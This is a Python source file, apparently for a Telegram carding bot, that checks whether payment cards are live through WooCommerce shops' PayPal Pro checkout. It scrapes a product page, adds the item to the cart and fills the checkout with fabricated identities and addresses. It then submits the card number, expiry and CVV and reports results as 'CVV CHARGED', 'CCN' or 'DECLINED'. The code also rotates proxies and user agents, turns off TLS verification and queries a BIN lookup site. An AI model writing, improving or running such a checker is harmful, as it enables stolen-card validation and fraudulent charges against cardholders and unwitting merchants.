"""
PayPal Pro Gateway Checker - Pure Python Implementation
Converted from allpaypalpro.php
Command: /pro

Optimized for production use with:
- Connection pooling via requests.Session
- Retry logic with exponential backoff
- Improved error handling
- Memory-efficient operations
- Configurable timeouts
"""

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import re
import random
import string
import time
import json
import os
from functools import lru_cache
from urllib.parse import urlencode, urlparse
from bs4 import BeautifulSoup

# Disable SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Production configuration
CONFIG = {
    'timeout': 25,  # Request timeout in seconds
    'max_retries': 2,  # Max retry attempts
    'backoff_factor': 0.3,  # Exponential backoff factor
    'pool_connections': 10,  # Connection pool size
    'pool_maxsize': 20,  # Max pool size
    'bin_cache_size': 500,  # BIN info cache size
}


# User agents list
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
]

# Address database by country
ADDRESSES = {
    'NZ': [
        {'street': '248 Princes Street', 'city': 'Grafton', 'zip': '1010', 'state': 'Auckland', 'phone': '(028) 8784-059'},
        {'street': '75 Queen Street', 'city': 'Auckland', 'zip': '1010', 'state': 'Auckland', 'phone': '(029) 1234-567'},
        {'street': '12 Victoria Avenue', 'city': 'Wanganui', 'zip': '4500', 'state': 'Manawatu-Wanganui', 'phone': '(021) 9876-543'},
        {'street': '34 Durham Street', 'city': 'Tauranga', 'zip': '3110', 'state': 'Bay of Plenty', 'phone': '(020) 1122-3344'},
    ],
    'AU': [
        {'street': '123 George Street', 'city': 'Sydney', 'zip': '2000', 'state': 'NSW', 'phone': '+61 2 1234 5678'},
        {'street': '456 Collins Street', 'city': 'Melbourne', 'zip': '3000', 'state': 'VIC', 'phone': '+61 3 8765 4321'},
        {'street': '789 Queen Street', 'city': 'Brisbane', 'zip': '4000', 'state': 'QLD', 'phone': '+61 7 9876 5432'},
    ],
    'GB': [
        {'street': '10 Downing Street', 'city': 'London', 'zip': 'SW1A 2AA', 'state': '', 'phone': '+44 20 7925 0918'},
        {'street': '221B Baker Street', 'city': 'London', 'zip': 'NW1 6XE', 'state': '', 'phone': '+44 20 7224 3688'},
        {'street': '160 Piccadilly', 'city': 'London', 'zip': 'W1J 9EB', 'state': '', 'phone': '+44 20 7493 4944'},
    ],
    'CA': [
        {'street': '123 Main Street', 'city': 'Toronto', 'zip': 'M5H 2N2', 'state': 'Ontario', 'phone': '(416) 555-0123'},
        {'street': '456 Maple Avenue', 'city': 'Vancouver', 'zip': 'V6E 1B5', 'state': 'British Columbia', 'phone': '(604) 555-7890'},
        {'street': '789 King Street', 'city': 'Montreal', 'zip': 'H3A 1J9', 'state': 'Quebec', 'phone': '(514) 555-3456'},
    ],
    'US': [
        {'street': '1600 Pennsylvania Avenue NW', 'city': 'Washington', 'zip': '20500', 'state': 'DC', 'phone': '+1 202-456-1111'},
        {'street': '1 Infinite Loop', 'city': 'Cupertino', 'zip': '95014', 'state': 'CA', 'phone': '+1 408-996-1010'},
        {'street': '350 Fifth Avenue', 'city': 'New York', 'zip': '10118', 'state': 'NY', 'phone': '+1 212-736-3100'},
        {'street': '500 S Buena Vista St', 'city': 'Burbank', 'zip': '91521', 'state': 'CA', 'phone': '+1 818-560-1000'},
    ],
    'JP': [
        {'street': '1 Chome-1-2 Oshiage', 'city': 'Sumida City, Tokyo', 'zip': '131-0045', 'state': 'Tokyo', 'phone': '+81 3-1234-5678'},
        {'street': '2-3-4 Shinjuku', 'city': 'Shinjuku, Tokyo', 'zip': '160-0022', 'state': 'Tokyo', 'phone': '+81 3-8765-4321'},
    ],
    'SG': [
        {'street': '10 Anson Road', 'city': 'Singapore', 'zip': '079903', 'state': 'Central Region', 'phone': '(+65) 6221-1234'},
        {'street': '1 Raffles Place', 'city': 'Singapore', 'zip': '048616', 'state': 'Central Region', 'phone': '(+65) 6532-5678'},
    ],
    'MY': [
        {'street': 'No 56, Jalan Bukit Bintang', 'city': 'Kuala Lumpur', 'zip': '55100', 'state': 'Wilayah Persekutuan', 'phone': '+60 3-1234 5678'},
        {'street': 'No 78, Jalan Ampang', 'city': 'Kuala Lumpur', 'zip': '50450', 'state': 'Wilayah Persekutuan', 'phone': '+60 3-8765 4321'},
    ],
    'TH': [
        {'street': '123 Sukhumvit Road', 'city': 'Bangkok', 'zip': '10110', 'state': 'Bangkok', 'phone': '(+66) 2-123-4567'},
        {'street': '456 Silom Road', 'city': 'Bangkok', 'zip': '10500', 'state': 'Bangkok', 'phone': '(+66) 2-234-5678'},
    ],
    'NL': [
        {'street': '1 Dam Square', 'city': 'Amsterdam', 'zip': '1012 JS', 'state': 'North Holland', 'phone': '(+31) 20-555-1234'},
        {'street': '100 Mauritskade', 'city': 'The Hague', 'zip': '2599 BR', 'state': 'South Holland', 'phone': '(+31) 70-789-4567'},
    ],
    'ZA': [
        {'street': '10 Adderley Street', 'city': 'Cape Town', 'zip': '8000', 'state': 'Western Cape', 'phone': '(+27) 21-123-4567'},
        {'street': '150 Rivonia Road', 'city': 'Sandton', 'zip': '2196', 'state': 'Gauteng', 'phone': '(+27) 11-234-5678'},
    ],
    'HK': [
        {'street': "1 Queen's Road Central", 'city': 'Central', 'zip': '', 'state': 'Hong Kong Island', 'phone': '(+852) 2523-1234'},
        {'street': '88 Gloucester Road', 'city': 'Wan Chai', 'zip': '', 'state': 'Hong Kong Island', 'phone': '(+852) 2598-5678'},
    ],
    'PH': [
        {'street': '1234 Makati Ave', 'city': 'Makati', 'zip': '1200', 'state': 'Metro Manila', 'phone': '+63 2 1234 5678'},
        {'street': '5678 Bonifacio Drive', 'city': 'Taguig', 'zip': '1634', 'state': 'Metro Manila', 'phone': '+63 2 8765 4321'},
    ],
}

# First names for random generation
FIRST_NAMES = [
    'John', 'Kyla', 'Sarah', 'Michael', 'Emma', 'James', 'Olivia', 'William', 'Ava', 'Benjamin',
    'Isabella', 'Jacob', 'Lily', 'Daniel', 'Mia', 'Alexander', 'Charlotte', 'Samuel', 'Sophia', 'Matthew',
    'Amelia', 'David', 'Chloe', 'Luke', 'Ella', 'Henry', 'Grace', 'Andrew', 'Natalie', 'Ethan',
]

# Last names for random generation
LAST_NAMES = [
    'Smith', 'Johnson', 'Williams', 'Jones', 'Brown', 'Davis', 'Miller', 'Wilson', 'Moore', 'Taylor',
    'Anderson', 'Thomas', 'Jackson', 'White', 'Harris', 'Martin', 'Thompson', 'Garcia', 'Martinez', 'Roberts',
    'Walker', 'Perez', 'Young', 'Allen', 'King', 'Wright', 'Scott', 'Green', 'Adams', 'Baker',
]

# Email domains
EMAIL_DOMAINS = ['gmail.com', 'yahoo.com', 'outlook.com', 'icloud.com', 'hotmail.com', 'protonmail.com']


def get_str(string, start, end):
    """Extract string between two delimiters"""
    try:
        start_idx = string.index(start) + len(start)
        end_idx = string.index(end, start_idx)
        return string[start_idx:end_idx]
    except ValueError:
        return None


def generate_random_word(length=20):
    """Generate random word"""
    letters = string.ascii_letters
    return ''.join(random.choice(letters) for _ in range(length))


def generate_device_id(length=32):
    """Generate device/correlation ID"""
    chars = '0123456789abcdefghijklmnopqrstuvwxyz'
    return ''.join(random.choice(chars) for _ in range(length))


def get_card_type(cc):
    """Determine card type based on prefix"""
    if cc.startswith('4'):
        return 'visa', 'Visa', 'VI', '001'
    elif cc.startswith('5'):
        return 'mastercard', 'MasterCard', 'MC', '002'
    elif cc.startswith('34') or cc.startswith('37'):
        return 'americanexpress', 'American Express', 'AE', '003'
    elif cc.startswith('6011') or cc.startswith('65') or (cc[:6].isdigit() and 622126 <= int(cc[:6]) <= 622925):
        return 'discover', 'Discover', 'DI', '004'
    else:
        return 'unknown', 'Unknown', None, None


def get_country_from_domain(hostname):
    """Determine country based on site domain"""
    hostname = hostname.lower()
    if hostname.endswith('.co.uk'):
        return 'GB'
    elif hostname.endswith('.au'):
        return 'AU'
    elif hostname.endswith('.ca'):
        return 'CA'
    elif hostname.endswith('.co.nz'):
        return 'NZ'
    elif hostname.endswith('.jp'):
        return 'JP'
    elif hostname.endswith('.ph'):
        return 'PH'
    elif hostname.endswith('.my'):
        return 'MY'
    elif hostname.endswith('.sg'):
        return 'SG'
    elif hostname.endswith('.th'):
        return 'TH'
    elif hostname.endswith('.nl'):
        return 'NL'
    elif hostname.endswith('.hk'):
        return 'HK'
    elif hostname.endswith('.co.za'):
        return 'ZA'
    else:
        return 'US'


def get_random_address(country):
    """Get random address for country"""
    if country not in ADDRESSES:
        country = 'US'
    addresses = ADDRESSES[country]
    return random.choice(addresses)


def generate_random_name():
    """Generate random first and last name"""
    fname = random.choice(FIRST_NAMES)
    lname = random.choice(LAST_NAMES)
    num = str(random.randint(100, 999))
    return fname, lname, num


def generate_random_email(fname, lname):
    """Generate random email"""
    domain = random.choice(EMAIL_DOMAINS)
    return f"{fname.lower()}.{lname.lower()}@{domain}"


@lru_cache(maxsize=CONFIG['bin_cache_size'])
def get_bin_info(bin_number):
    """Get BIN information from API with caching"""
    default_info = {
        'brand': 'Unknown',
        'type': 'Unknown',
        'level': 'Unknown',
        'bank': 'Unknown',
        'country': 'Unknown',
    }
    try:
        response = requests.get(
            f'https://bins.antipublic.cc/bins/{bin_number}',
            timeout=5,
            headers={'User-Agent': random.choice(USER_AGENTS)},
            verify=False
        )
        if response.status_code == 200 and response.text:
            data = response.json()
            return {
                'brand': data.get('brand', 'Unknown'),
                'type': data.get('type', 'Unknown'),
                'level': data.get('level', 'Unknown'),
                'bank': data.get('bank', 'Unknown'),
                'country': data.get('country_name', 'Unknown'),
            }
    except (requests.RequestException, json.JSONDecodeError, KeyError):
        pass
    return default_info


def create_session(proxies=None):
    """Create optimized requests session with connection pooling and retry logic"""
    session = requests.Session()
    
    # Configure retry strategy
    retry_strategy = Retry(
        total=CONFIG['max_retries'],
        backoff_factor=CONFIG['backoff_factor'],
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["HEAD", "GET", "POST", "OPTIONS"]
    )
    
    # Configure adapter with connection pooling
    adapter = HTTPAdapter(
        max_retries=retry_strategy,
        pool_connections=CONFIG['pool_connections'],
        pool_maxsize=CONFIG['pool_maxsize']
    )
    
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    
    if proxies:
        session.proxies.update(proxies)
    
    return session


def country_code_to_emoji(country_code):
    """Convert country code to emoji flag"""
    country_emoji_map = {
        'PH': '🇵🇭', 'US': '🇺🇸', 'GB': '🇬🇧', 'CA': '🇨🇦', 'AU': '🇦🇺',
        'DE': '🇩🇪', 'FR': '🇫🇷', 'IN': '🇮🇳', 'JP': '🇯🇵', 'CN': '🇨🇳',
        'BR': '🇧🇷', 'RU': '🇷🇺', 'ZA': '🇿🇦', 'NG': '🇳🇬', 'MX': '🇲🇽',
        'IT': '🇮🇹', 'ES': '🇪🇸', 'NL': '🇳🇱', 'SE': '🇸🇪', 'CH': '🇨🇭',
        'KR': '🇰🇷', 'SG': '🇸🇬', 'NZ': '🇳🇿', 'MY': '🇲🇾', 'TH': '🇹🇭',
        'HK': '🇭🇰',
    }
    if not country_code or len(country_code) != 2:
        return '🏳️'
    return country_emoji_map.get(country_code.upper(), '🏳️')


def normalize_card_format(card_input):
    """
    Normalize card format to number|mm|yy|cvv
    Supports:
    - 5401683112957490|10|2029|741 (pipe-separated)
    - 4284303806640816 0628 116 (space-separated with mmyy)
    """
    card_input = card_input.strip()
    
    # Check if already in pipe format
    if '|' in card_input:
        parts = card_input.split('|')
        if len(parts) == 4:
            number, mm, yy, cvv = parts
            # Normalize year to 2 digits
            if len(yy) == 4:
                yy = yy[2:]
            # Normalize month to 2 digits with leading zero
            mm = mm.zfill(2)
            return f"{number}|{mm}|{yy}|{cvv}"
        return None
    
    # Handle space-separated format: number mmyy cvv
    parts = card_input.split()
    if len(parts) == 3:
        number, mmyy, cvv = parts
        if len(mmyy) == 4:
            mm = mmyy[:2]
            yy = mmyy[2:]
            return f"{number}|{mm}|{yy}|{cvv}"
    
    return None


def is_card_expired(month, year):
    """
    Check if a card is expired based on month and year.
    Returns True if expired, False otherwise.
    """
    import datetime
    
    # Normalize year to 4 digits
    if len(str(year)) == 2:
        year = int('20' + str(year))
    else:
        year = int(year)
    
    month = int(month)
    
    # Get current date
    now = datetime.datetime.now()
    current_year = now.year
    current_month = now.month
    
    # Card is valid through the end of the expiration month
    if year < current_year:
        return True
    elif year == current_year and month < current_month:
        return True
    
    return False


_sites_cache = None
_sites_cache_time = 0
SITES_CACHE_TTL = 300  # 5 minutes cache TTL


def load_sites(force_reload=False):
    """Load sites from sites.txt with caching"""
    global _sites_cache, _sites_cache_time
    
    current_time = time.time()
    
    # Return cached sites if still valid
    if not force_reload and _sites_cache is not None and (current_time - _sites_cache_time) < SITES_CACHE_TTL:
        return _sites_cache
    
    sites_file = os.path.join(os.path.dirname(__file__), 'sites.txt')
    sites = []
    if os.path.exists(sites_file):
        with open(sites_file, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    sites.append(line)
    
    _sites_cache = sites
    _sites_cache_time = current_time
    return sites


def clear_sites_cache():
    """Clear the sites cache to force reload"""
    global _sites_cache, _sites_cache_time
    _sites_cache = None
    _sites_cache_time = 0


def clear_bin_cache():
    """Clear the BIN info cache"""
    get_bin_info.cache_clear()


def check_card(card_input, proxy=None, sites=None):
    """
    Check a card using PayPal Pro gateway
    
    Args:
        card_input: Card in format number|mm|yy|cvv
        proxy: Optional proxy string (host:port:user:pass)
        sites: Optional list of sites to use
        
    Returns:
        dict with result information
    """
    start_time = time.time()
    
    # Normalize card format
    normalized = normalize_card_format(card_input)
    if not normalized:
        return {
            'status': 'ERROR',
            'message': 'Invalid card format',
            'card': card_input,
        }
    
    # Parse card details
    parts = normalized.split('|')
    cc, mes, ano, cvv = parts
    
    # Format card parts
    cc6 = cc[:6]
    ctype, brand, ctype1, ctype4 = get_card_type(cc)
    
    # Format year
    if len(ano) == 2:
        ano_full = '20' + ano
        ano_short = ano
    else:
        ano_full = ano
        ano_short = ano[2:]
    
    # Format month
    mes_with_zero = mes.zfill(2)
    mes_no_zero = mes.lstrip('0') or '0'
    
    # Validate expiration date
    if is_card_expired(mes_with_zero, ano_short):
        # Get BIN info for expired card response
        bin_info = get_bin_info(cc6)
        return {
            'status': 'DECLINED',
            'approved': False,
            'message': 'Card expiration date is invalid (EXPIRED)',
            'card': card_input,
            'site': 'N/A',
            'price': 'N/A',
            'bin_info': bin_info,
            'time': '0.00s',
        }
    
    # Get user agent
    ua = random.choice(USER_AGENTS)
    
    # Setup proxy
    proxies = None
    if proxy:
        proxy_parts = proxy.split(':')
        if len(proxy_parts) == 4:
            host, port, user, passwd = proxy_parts
            proxies = {
                'http': f'http://{user}:{passwd}@{host}:{port}',
                'https': f'http://{user}:{passwd}@{host}:{port}',
            }
        elif len(proxy_parts) == 2:
            host, port = proxy_parts
            proxies = {
                'http': f'http://{host}:{port}',
                'https': f'http://{host}:{port}',
            }
    
    # Request timeout
    timeout = CONFIG['timeout']
    
    # Load sites if not provided
    if not sites:
        sites = load_sites()
    
    if not sites:
        return {
            'status': 'ERROR',
            'message': 'No sites configured',
            'card': card_input,
        }
    
    # Select random site
    product_page_url = random.choice(sites)
    parsed_url = urlparse(product_page_url)
    hostname = parsed_url.netloc
    
    # Determine country and get address
    country = get_country_from_domain(hostname)
    address = get_random_address(country)
    
    # Generate random user info
    fname, lname, numname = generate_random_name()
    email = generate_random_email(fname, lname)
    username = f"{fname.lower()}_{numname}"
    
    # Create optimized session with connection pooling
    session = create_session(proxies)
    
    # Headers for requests
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'max-age=0',
        'origin': f'https://{hostname}',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'referer': f'https://{hostname}/cart',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': ua,
    }
    
    try:
        # Step 1: Get product page
        response = session.get(
            product_page_url,
            headers=headers,
            verify=False,
            timeout=timeout
        )
        
        if response.status_code != 200:
            return {
                'status': 'ERROR',
                'message': f'Failed to load product page (HTTP {response.status_code})',
                'card': card_input,
                'site': hostname,
            }
        
        # Parse product page
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Find product ID
        product_id = None
        variation_id = None
        
        # Try variations form
        form = soup.find('form', class_='variations_form')
        if form:
            product_id = form.get('data-product_id')
            variation_data = form.get('data-product_variations')
            if variation_data and variation_data != 'false':
                try:
                    variations = json.loads(variation_data)
                    if variations:
                        variation_id = variations[0].get('variation_id')
                except:
                    pass
        
        # Try input fields
        if not product_id:
            input_field = soup.find('input', {'name': ['product_id', 'add-to-cart']})
            if input_field:
                product_id = input_field.get('value')
        
        # Try button
        if not product_id:
            button = soup.find('button', {'name': 'add-to-cart'})
            if button:
                product_id = button.get('value')
        
        if not product_id:
            return {
                'status': 'ERROR',
                'message': 'Could not find product ID',
                'card': card_input,
                'site': hostname,
            }
        
        # Build add to cart URL
        query_params = {
            'quantity': 1,
            'add-to-cart': product_id,
        }
        if variation_id:
            query_params['variation_id'] = variation_id
            query_params['product_id'] = product_id
        
        final_url = f"{product_page_url}?{urlencode(query_params)}"
        
        # Step 2: Add to cart
        response = session.get(
            final_url,
            headers=headers,
            verify=False,
            timeout=timeout
        )
        
        # Step 3: Go to checkout
        checkout_url = f"https://{hostname}/checkout"
        response = session.get(
            checkout_url,
            headers=headers,
            verify=False,
            timeout=timeout
        )
        
        checkout_html = response.text
        
        # Find payment method
        payment_methods = [
            'paypal_pro', 'paypalpro', 'wpg_paypal_pro', 
            'wpg_paypal_pro_payflow', 'paypal_pro_payflow', 'paypalpropayflow'
        ]
        
        selected_payment_method = None
        for method in payment_methods:
            if f'value="{method}"' in checkout_html:
                selected_payment_method = method
                break
        
        if not selected_payment_method:
            return {
                'status': 'ERROR',
                'message': 'No PayPal Pro payment method found',
                'card': card_input,
                'site': hostname,
            }
        
        # Get nonce
        nonce = get_str(checkout_html, 'name="woocommerce-process-checkout-nonce" value="', '"')
        if not nonce:
            nonce = get_str(checkout_html, 'id="woocommerce-process-checkout-nonce" name="woocommerce-process-checkout-nonce" value="', '"')
        
        # Get price
        price = 'N/A'
        price_match = re.search(r'<span class="woocommerce-Price-amount amount">.*?([£$€]?\d+\.?\d*)', checkout_html, re.DOTALL)
        if price_match:
            price = price_match.group(1)
        
        # Step 4: Submit checkout
        # Build dynamic field names based on selected payment method
        pm = selected_payment_method  # shorthand
        
        checkout_data = {
            'billing_first_name': fname,
            'billing_last_name': lname,
            'billing_company': '',
            'billing_country': country,
            'billing_address_1': address['street'],
            'billing_address_2': '',
            'billing_city': address['city'],
            'billing_state': address['state'],
            'billing_postcode': address['zip'],
            'billing_phone': address['phone'],
            'billing_email': email,
            'account_username': username,
            'account_password': lname,
            'payment_method': selected_payment_method,
            
            # Dynamic fields based on selected payment method
            # WooCommerce standard format: {payment_method}-card-{field}
            f'{pm}-card-number': cc,
            f'{pm}-card-expiry': f"{mes_with_zero} / {ano_short}",
            f'{pm}-card-cvc': cvv,
            
            # Underscore format: {payment_method}_card_{field}
            f'{pm}_card_number': cc,
            f'{pm}_card_expiry': f"{mes_with_zero} / {ano_short}",
            f'{pm}_card_cvc': cvv,
            
            # Separate month/year fields (2-digit year)
            f'{pm}_card_expiration_month': mes_with_zero,
            f'{pm}_card_expiration_year': ano_short,
            f'{pm}_card_exp_month': mes_with_zero,
            f'{pm}_card_exp_year': ano_short,
            
            # Separate month/year fields (4-digit year) - some plugins need this
            f'{pm}_card_expiry_month': mes_with_zero,
            f'{pm}_card_expiry_year': ano_full,
            
            # Angelleye PayPal Pro specific fields
            'paypal_pro_card_number': cc,
            'paypal_pro_card_cvc': cvv,
            'paypal_pro_card_expdate_month': mes_with_zero,
            'paypal_pro_card_expdate_year': ano_full,
            
            # PayPal Pro fields - all variations
            'paypal_pro-card-number': cc,
            'paypal_pro-card-expiry': f"{mes_with_zero} / {ano_short}",
            'paypal_pro-card-cvc': cvv,
            'paypal_pro_card_expiration_month': mes_with_zero,
            'paypal_pro_card_expiration_year': ano_full,
            'paypal_pro_card_exp_month': mes_with_zero,
            'paypal_pro_card_exp_year': ano_full,
            
            # WPG PayPal Pro fields
            'wpg_paypal_pro-card-number': cc,
            'wpg_paypal_pro-card-expiry': f"{mes_with_zero} / {ano_short}",
            'wpg_paypal_pro-card-cvc': cvv,
            'wpg_paypal_pro_card_number': cc,
            'wpg_paypal_pro_card_expiry_month': mes_with_zero,
            'wpg_paypal_pro_card_expiry_year': ano_full,
            'wpg_paypal_pro_card_cvc': cvv,
            
            # PayPal Pro Payflow fields
            'wpg_paypal_pro_payflow-card-number': cc,
            'wpg_paypal_pro_payflow-card-expiry': f"{mes_with_zero} / {ano_short}",
            'wpg_paypal_pro_payflow-card-cvc': cvv,
            'paypal_pro_payflow-card-cardholder-first': fname,
            'paypal_pro_payflow-card-cardholder-last': lname,
            'paypal_pro_payflow-card-number': cc,
            'paypal_pro_payflow-card-expiry': f"{mes_with_zero} / {ano_short}",
            'paypal_pro_payflow-card-cvc': cvv,
            'paypal_pro_payflow_card_number': cc,
            'paypal_pro_payflow_card_exp_month': mes_with_zero,
            'paypal_pro_payflow_card_exp_year': ano_full,
            'paypal_pro_payflow_card_cvc': cvv,
            'paypalpropayflow-card-number': cc,
            'paypalpropayflow-card-expiry': f"{mes_with_zero} / {ano_full}",
            'paypalpropayflow-card-cvc': cvv,
            
            # Generic credit card fields that some themes use
            'card_number': cc,
            'card_exp_month': mes_with_zero,
            'card_exp_year': ano_full,
            'card_cvc': cvv,
            
            # EXPDATE formats used by PayPal API directly
            'expdate': f"{mes_with_zero}{ano_full}",  # MMYYYY
            'EXPDATE': f"{mes_with_zero}{ano_full}",  # MMYYYY uppercase
            'exp_date': f"{mes_with_zero}/{ano_short}",  # MM/YY
            
            # Credit card type
            'card_type': ctype,
            'creditcardtype': ctype,
            f'{pm}_card_type': ctype,
            
            'terms': 'on',
            'terms-field': '1',
            '_wpnonce': nonce or '',
            '_wp_http_referer': '/?wc-ajax=update_order_review',
        }
        
        ajax_headers = headers.copy()
        ajax_headers['X-Requested-With'] = 'XMLHttpRequest'
        
        response = session.post(
            f"https://{hostname}/?wc-ajax=checkout",
            headers=ajax_headers,
            data=checkout_data,
            verify=False,
            timeout=timeout
        )
        
        payment_response = response.text
        elapsed_time = time.time() - start_time
        
        # Get BIN info
        bin_info = get_bin_info(cc6)
        
        # Parse response
        try:
            payment_data = json.loads(payment_response)
            messages = payment_data.get('messages', '')
            redirect = payment_data.get('redirect', '')
            result = payment_data.get('result', '')
            
            # Clean messages
            if messages:
                soup = BeautifulSoup(messages, 'html.parser')
                messages = soup.get_text(strip=True)
        except:
            messages = payment_response
            redirect = ''
            result = ''
        
        # Determine status based on response
        if result == 'success' and 'order-received' in redirect:
            return {
                'status': 'CVV',
                'approved': True,
                'message': 'CVV CHARGED',
                'card': card_input,
                'site': hostname,
                'price': price,
                'receipt': redirect,
                'bin_info': bin_info,
                'time': f"{elapsed_time:.2f}s",
            }
        elif 'Please enter a valid Credit Card Verification Number' in messages:
            return {
                'status': 'CCN',
                'approved': True,
                'message': 'INVALID CVC',
                'card': card_input,
                'site': hostname,
                'price': price,
                'bin_info': bin_info,
                'time': f"{elapsed_time:.2f}s",
            }
        elif 'CVV2 Mismatch' in messages:
            return {
                'status': 'CCN',
                'approved': True,
                'message': 'CVV2 MISMATCH',
                'card': card_input,
                'site': hostname,
                'price': price,
                'bin_info': bin_info,
                'time': f"{elapsed_time:.2f}s",
            }
        else:
            # Declined
            decline_reason = messages if messages else 'Unknown error'
            return {
                'status': 'DECLINED',
                'approved': False,
                'message': decline_reason[:100],  # Truncate long messages
                'card': card_input,
                'site': hostname,
                'price': price,
                'bin_info': bin_info,
                'time': f"{elapsed_time:.2f}s",
            }
            
    except requests.exceptions.Timeout:
        return {
            'status': 'ERROR',
            'message': 'Request timeout',
            'card': card_input,
            'site': hostname if 'hostname' in locals() else 'Unknown',
        }
    except requests.exceptions.ConnectionError:
        return {
            'status': 'ERROR',
            'message': 'Connection failed',
            'card': card_input,
            'site': hostname if 'hostname' in locals() else 'Unknown',
        }
    except requests.exceptions.RequestException as e:
        return {
            'status': 'ERROR',
            'message': f'Request error: {str(e)[:80]}',
            'card': card_input,
            'site': hostname if 'hostname' in locals() else 'Unknown',
        }
    except Exception as e:
        return {
            'status': 'ERROR',
            'message': str(e)[:100],
            'card': card_input,
            'site': hostname if 'hostname' in locals() else 'Unknown',
        }
    finally:
        # Clean up session resources
        try:
            session.close()
        except:
            pass


def format_result(result):
    """Format result for display"""
    status = result.get('status', 'ERROR')
    approved = result.get('approved', False)
    message = result.get('message', 'Unknown')
    card = result.get('card', 'Unknown')
    time_taken = result.get('time', 'N/A')
    bin_info = result.get('bin_info', {})
    
    # Format time - extract just the number for cleaner display
    time_display = time_taken.replace('s', ' 𝘀𝗲𝗰𝗼𝗻𝗱𝘀')
    
    # Build BIN info line
    bin_parts = []
    if bin_info.get('brand') and bin_info.get('brand') != 'Unknown':
        bin_parts.append(bin_info['brand'])
    if bin_info.get('type') and bin_info.get('type') != 'Unknown':
        bin_parts.append(bin_info['type'])
    if bin_info.get('level') and bin_info.get('level') != 'Unknown':
        bin_parts.append(bin_info['level'])
    if bin_info.get('country') and bin_info.get('country') != 'Unknown':
        bin_parts.append(bin_info['country'])
    bin_info_str = ' - '.join(bin_parts) if bin_parts else 'Unknown'
    
    bank_str = bin_info.get('bank', 'Unknown')
    
    # Determine status header with emoji
    if status == 'CVV':
        status_header = "#CVV ✅"
    elif status == 'CCN':
        status_header = "#CCN ✅"
    elif status == 'DECLINED':
        status_header = "#DECLINED ❌"
    else:
        status_header = "#ERROR ❌"
    
    # Format for CVV, CCN, and DECLINED statuses
    if status in ('CVV', 'CCN', 'DECLINED'):
        result_text = f"""{status_header}

𝗖𝗖 ⇾ {card}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Paypal Pro
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {message}

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info_str}
𝗕𝗮𝗻𝗸: {bank_str}

𝗧𝗼𝗼𝗸 {time_display}

𝗕𝗼𝘁 𝗯𝘆 : @TUMAOB"""
    else:
        # ERROR status - keep minimal format
        result_text = f"""{status_header}

𝗖𝗖 ⇾ {card}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Paypal Pro
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {message}

𝗕𝗼𝘁 𝗯𝘆 : @TUMAOB"""
    
    return result_text.strip()


# For testing
if __name__ == '__main__':
    # Test card (use a test card)
    test_card = "4111111111111111|12|25|123"
    result = check_card(test_card)
    print(format_result(result))
